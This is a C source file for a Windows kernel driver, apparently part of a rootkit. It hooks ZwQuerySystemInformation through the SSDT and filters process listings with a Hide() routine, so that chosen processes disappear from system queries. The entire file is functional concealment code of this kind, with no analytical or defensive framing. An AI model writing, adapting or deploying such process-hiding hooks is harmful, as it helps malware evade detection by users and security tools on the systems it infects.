#include "hide/process/processhider.h"

#include <ntddk.h>
#include <wchar.h>
#include <string.h>
#include <Ntifs.h>

#include "hide/process/processhider_algorithm.h"
#include "hook/hookfactory.h"
#include "hook/ssdt_utils.h"
#include "dbgutils.h"


wchar_t wchar_ZwQuerySystemInformation[] = L"ZwQuerySystemInformation";

s_SSTHook g_hook;
NtQuerySystemInformation_t g_original_function;

int processhider_init()
{
    if ( !ssdt_hook_w(&g_hook,
                      process_hook_function,
                      wchar_ZwQuerySystemInformation,
                      sizeof(wchar_ZwQuerySystemInformation)) )
    {
        return ( 0 );
    }

    g_original_function = (NtQuerySystemInformation_t)(g_hook.org_func);

    return ( 1 );
}

int processhider_deinit()
{
    return ( disclaim_hook(&g_hook) );
}

NTSTATUS process_hook_function(
    IN       SYSTEM_INFORMATION_CLASS SystemInformationClass,
    IN OUT   PVOID                    SystemInformation,
    IN       ULONG                    SystemInformationLength,
    OUT      PULONG                   ReturnLength               OPTIONAL)
{
    // Call original function
    NTSTATUS status =  g_original_function(SystemInformationClass,
                                           SystemInformation,
                                           SystemInformationLength,
                                           ReturnLength);

    // Ignore a failure and non-SystemProcessInformation queries
    if ( !NT_SUCCESS(status) || SystemProcessInformation != SystemInformationClass )
        return ( status );

    // Filter processes out
    int error_code = Hide(SystemInformation);

    return ( error_code );
}
